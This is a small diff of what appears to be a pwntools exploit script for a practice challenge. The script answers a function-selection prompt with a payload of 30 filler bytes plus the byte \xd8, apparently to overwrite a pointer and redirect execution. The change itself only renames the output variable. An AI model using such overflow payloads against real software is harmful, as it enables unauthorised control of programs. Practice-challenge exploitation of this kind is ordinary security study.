@@ -7,5 +7,5 @@ p.recvuntil('Which function would you like to call?')
 payload='a'*30+'\xd8'
 p.sendline(payload)
 
-a=p.recvall()
-print a
+res=p.recvall()
+print res
